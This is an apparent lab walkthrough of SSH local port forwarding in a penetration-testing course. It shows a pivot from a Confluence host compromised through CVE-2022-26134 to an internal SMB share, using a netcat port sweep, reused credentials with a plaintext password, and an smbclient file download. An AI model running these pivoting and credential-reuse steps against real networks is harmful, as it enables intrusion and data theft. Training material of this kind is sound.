# Hack The Box Academy: Port Redirection and SSH Tunneling

## Section 19.3.1: SSH local port forwarding

Earlier steps used `socat` to reach PostgreSQL via `CONFLUENCE01`. This section uses **SSH local port forwarding** (`ssh -L`) when Socat is not the right tool.

**Difference:** with Socat, the forwarder listens on the same host that runs the forwarder process. With **local** SSH port forwarding, the **SSH client** (here: `CONFLUENCE01`) opens the listener; the SSH **server** (`PGDATABASE01`) terminates the tunnel and connects to the target you specify. Traffic flows: client → SSH server → internal service.

**Scenario:** `CONFLUENCE01` can bind on its WAN interface. `PGDATABASE01` has a second interface on `172.16.50.0/24`. A host at `172.16.50.217` offers **SMB on 445**. Goal: reach that SMB service from **Kali** using **CONFLUENCE01:4455 → PGDATABASE01 → 172.16.50.217:445**.

---

### Step 1: Shell on CONFLUENCE01

Use CVE-2022-26134 to obtain a shell on `CONFLUENCE01`, then stabilize TTY as needed:

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

Allocates a **pseudo-TTY** so line editing, `su`, and full-screen tools behave more predictably than in a raw reverse shell.

---

### Step 2: SSH from CONFLUENCE01 to PGDATABASE01

Use valid credentials (e.g. `database_admin`):

```bash
ssh database_admin@10.4.50.215
```

First hop is **interactive SSH** to the database host on its **DMZ** address. Accept the host key when prompted (fingerprint pinning in real ops).

| Detail | Note |
|--------|------|
| Default port | **22/tcp** unless `-p` is given |
| User | Lab account recovered earlier (`database_admin`) |

On success, the shell prompt should reflect **`PGDATABASE01`**.

---

### Step 3: Interface enumeration

```bash
ip addr
```

Typical result:

- `ens192` → `10.4.50.215` (DMZ toward `CONFLUENCE01`)
- `ens224` → `172.16.50.215` (internal segment)

Routing:

```bash
ip route
```

```text
10.4.50.0/24 dev ens192
172.16.50.0/24 dev ens224
```

`PGDATABASE01` therefore routes to both `10.4.50.0/24` and `172.16.50.0/24`.

---

### Step 4: Locate SMB on 172.16.50.0/24

Example sweep with `nc`:

```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

| `nc` flag | Meaning |
|-----------|---------|
| `-z` | **Zero-I/O** scan mode (do not send payload data) |
| `-v` | Verbose “succeeded/refused” messages |
| `-w 1` | **1 s** connect timeout per host (tune up on lossy links) |

Successful connect example:

```text
Connection to 172.16.50.217 445 port [tcp/microsoft-ds] succeeded!
```

**Finding:** `172.16.50.217` exposes SMB on **445**.

---

### Step 5: Problem statement

Kali cannot route to `172.16.50.217:445` directly. Running `smbclient` on `PGDATABASE01` may be impractical. **Local SSH forwarding** maps a port on `CONFLUENCE01` through the SSH session to `PGDATABASE01`, which then opens the connection to the internal SMB host.

---

### Step 6: SSH local forward

From `CONFLUENCE01` (first shell), open a forward **without** an interactive shell:

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

| Flag | Meaning |
|------|---------|
| `-N` | No remote command; forward only |
| `-L 0.0.0.0:4455:172.16.50.217:445` | On the **client** (`CONFLUENCE01`), listen on `0.0.0.0:4455`; send traffic through SSH so the **server** connects to `172.16.50.217:445` |

After authentication the session stays quiet; that is expected.

Verify listen state from another session on `CONFLUENCE01`:

```bash
ss -ntplu
```

| Flag | Meaning |
|------|---------|
| `-n` | Numeric ports (no service name resolution) |
| `-t` | TCP sockets |
| `-p` | Show **process** owning the socket (may need `sudo`) |
| `-l` | **Listening** sockets only |
| `-u` | UDP (optional here; harmless) |

Look for:

```text
tcp LISTEN 0.0.0.0:4455 users:(("ssh",pid=...,fd=...))
```

---

### Step 7: SMB from Kali through the forward

Point SMB at **WAN IP of `CONFLUENCE01`** and the forwarded port (example credentials `hr_admin`):

```bash
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

| Flag | Meaning |
|------|---------|
| `-p 4455` | **Non-default SMB port** on the pivot (your `-L` forward bind) |
| `-L` | List shares |
| `-U` / `--password` | Credentials (avoid `--password` in shell history in real tests; prefer `-A` file or prompt) |

Example share list:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
scripts         Disk
Users           Disk
```

**Notable share:** `scripts`.

Connect:

```bash
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
```

Connects to share **`scripts`** on the same forwarded endpoint.

Example listing:

```text
Provisioning.ps1
README.txt
```

Download:

```bash
get Provisioning.ps1
```

File transfer completes over the SSH tunnel to Kali.

---

## Key takeaways

- **Local** (`-L`) forwarding binds on the SSH **client** and delivers traffic to a host:port **as seen from the SSH server**.
- Useful when tools must run on Kali but only a jump host can reach the internal subnet.
- The example command:

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

implements **Kali → CONFLUENCE01:4455 → (SSH) → PGDATABASE01 → 172.16.50.217:445**.

---

## Summary

- Pivot without `socat` by chaining SSH and `-L`.
- Combine **credential reuse**, **routing knowledge**, and **forwarded SMB** to extract data from segmented Windows services.
- This pattern matches common **red team** and **assumed breach** exercises where multiple hops are required.

Always record listener addresses, ports, and credentials used in lab notes for reproducibility and for client deliverables.
